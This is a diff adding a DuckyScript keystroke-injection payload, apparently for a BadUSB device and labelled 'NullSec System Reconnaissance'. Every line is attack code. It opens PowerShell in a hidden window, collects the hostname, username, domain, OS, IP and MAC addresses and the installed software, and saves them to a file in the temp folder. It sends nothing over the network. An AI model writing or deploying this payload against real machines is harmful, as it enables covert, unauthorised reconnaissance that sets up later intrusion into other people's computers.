@@ -1,0 +1,34 @@
+REM NullSec System Reconnaissance
+REM Collects system info and saves to file
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden
+ENTER
+DELAY 1000
+
+STRING $info = @()
+ENTER
+STRING $info += "=== NULLSEC SYSTEM RECON ==="
+ENTER
+STRING $info += "Hostname: $env:COMPUTERNAME"
+ENTER
+STRING $info += "User: $env:USERNAME"
+ENTER
+STRING $info += "Domain: $env:USERDOMAIN"
+ENTER
+STRING $info += "OS: $(Get-WmiObject Win32_OperatingSystem).Caption"
+ENTER
+STRING $info += "IP: $((Get-NetIPAddress -AddressFamily IPv4).IPAddress -join ', ')"
+ENTER
+STRING $info += "MAC: $((Get-NetAdapter).MacAddress -join ', ')"
+ENTER
+STRING $info += "Installed Software:"
+ENTER
+STRING $info += (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName).DisplayName
+ENTER
+STRING $info | Out-File "$env:TEMP\recon.txt"
+ENTER
+STRING exit
+ENTER
